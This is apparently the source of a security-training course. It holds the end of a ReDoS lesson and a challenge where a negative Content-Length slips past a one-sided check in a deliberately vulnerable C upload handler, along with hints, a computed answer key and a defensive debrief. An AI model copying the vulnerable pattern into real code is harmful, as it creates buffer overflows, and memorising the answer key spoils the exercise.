- **Limit input length before** running any regex. Most ReDoS needs only tens of characters, but a cap bounds the damage.
- Use a **linear-time engine** (RE2, Rust's regex, Go's regexp) for patterns applied to untrusted input, or set a match **timeout** where the platform supports it (.NET, Java via interrupt).
- Lint for it: static checkers flag nested quantifiers in code review and CI.

**On the exam:** denial of service and resource exhaustion at the application layer are Security+ and CySA+ topics; ReDoS (CWE-1333) is a named weakness in OWASP and PenTest+ material.`,
  },

  {
    id: "parse-signed",
    title: "A Negative Length",
    level: 4,
    slug: "signed_becomes_enormous",
    time: 14,
    certs: ["PenTest+", "CEH", "GSEC", "CISSP"],
    objective: "A C parser checks a length header against a maximum, but the request sent a negative number. Work out the value memcpy actually receives as its size and submit it.",
    answerLabel: "Size passed to memcpy",
    answerPlaceholder: "a (large) number",
    lesson: `Text has to become numbers at some point, and parsing a number is validation too. This challenge joins the parsing track to the memory-safety one.

### Signed and unsigned
A C \`int\` is **signed**: its 32 bits can represent negative values. An \`unsigned int\` uses the same 32 bits for 0 to 4,294,967,295 only.

Negative numbers are stored in **two's complement**: −1 is all bits set (\`0xFFFFFFFF\`), −2 is \`0xFFFFFFFE\`, and so on. The bit pattern doesn't say which interpretation is intended; the *type* does. So when C converts a negative \`int\` to an unsigned type, the bits stay the same and the value becomes:

\`\`\`
unsigned value = 4,294,967,296 + (negative value)
        -1  ->  4,294,967,295
       -10  ->  4,294,967,286
\`\`\`

C performs this conversion **silently** whenever a signed value is assigned to, or passed as, an unsigned one. Sizes in C (\`size_t\`, the type \`memcpy\`, \`malloc\` and \`read\` take) are unsigned.

### The classic bug
\`\`\`c
int len = atoi(header);          // text -> number; "-1" is a perfectly good int
if (len > MAX_LEN) reject();     // -1 > 512 ? No. The check passes
memcpy(buf, data, len);          // len converted to unsigned: about 4 billion
\`\`\`

The programmer checked the upper bound and forgot that a signed number has a **lower** bound too. The check and the use interpret the same bits differently. In assembly you'd see the comparison compiled to a *signed* jump (\`jg\`/\`jle\`) where an unsigned one (\`ja\`/\`jbe\`) was needed.

\`atoi\` deserves its own warning: it returns 0 for garbage, has undefined behaviour on overflow, and offers no way to detect errors. \`strtol\` with full error checking is the safe replacement.

### Your task
Read \`upload.c\` and the request in \`request.txt\`. The length check passes. Compute the value \`copy_len\` holds when it reaches \`memcpy\`.`,
    hints: ["The header value is negative, and a negative number is never greater than MAX_LEN, so the check passes.", "copy_len is a 32-bit unsigned int. A negative value v becomes 4,294,967,296 + v.", "For example -10 becomes 4,294,967,286. Apply the same sum to the value in the request."],
    workspace: { type: "files" },
    setup(ctx) {
      const n = ctx.int(2, 250);
      const c = String.raw`#include <stdlib.h>
#include <string.h>

#define MAX_LEN 512

/* header_value is the text of the Content-Length header, e.g. "128" */
int store_upload(const char *header_value, const char *data) {
    char buf[MAX_LEN];

    int len = atoi(header_value);            /* text -> signed int */

    if (len > MAX_LEN) {                     /* too big? reject */
        return -1;
    }

    unsigned int copy_len = len;             /* signed -> unsigned, silently */
    memcpy(buf, data, copy_len);

    return save(buf, copy_len);
}
`;
      const req = `POST /upload HTTP/1.1
Host: files.internal.example
Content-Type: application/octet-stream
Content-Length: -${n}

[debug] store_upload(header_value="-${n}")
[debug] len = -${n}
[debug] len > MAX_LEN ?  no  -> continuing
[debug] copy_len = ?
`;
      return { _v: 4294967296 - n, files: [
        { name: "upload.c", kind: "code", label: "C", note: "The upload handler. Note the type of each variable.", data: c },
        { name: "request.txt", kind: "text", note: "The request that crashed the service.", data: req },
      ] };
    },
    check(input, ctx, env) { return norm.num(input) === env._v; },
    debrief: `The negative length slipped under the \`len > MAX_LEN\` check, then turned into a number just under 4.3 billion when stored in an unsigned variable. \`memcpy\` was told to copy gigabytes into a 512-byte stack buffer: a massive overflow, from a "validated" value.

Everything in this track was a version of the same failure: **the check and the use disagreed about what the input meant**. Here the disagreement was about a number's sign.

### How defenders stop it
- Use **unsigned types for sizes** from the start, and parse with \`strtoul\`/\`strtol\` checking for errors, range and trailing characters.
- Validate **both bounds**: \`if (len < 0 || len > MAX_LEN) reject;\`
- Compile with \`-Wall -Wextra -Wconversion -Wsign-compare\`: the compiler points at the implicit conversion.
- Fuzz with boundary values (−1, 0, maximum, maximum + 1) under AddressSanitizer and UBSan.

**On the exam:** integer signedness errors (CWE-195), improper input validation and buffer overflows are linked topics in PenTest+, CEH and CISSP software security.`,
  },
];
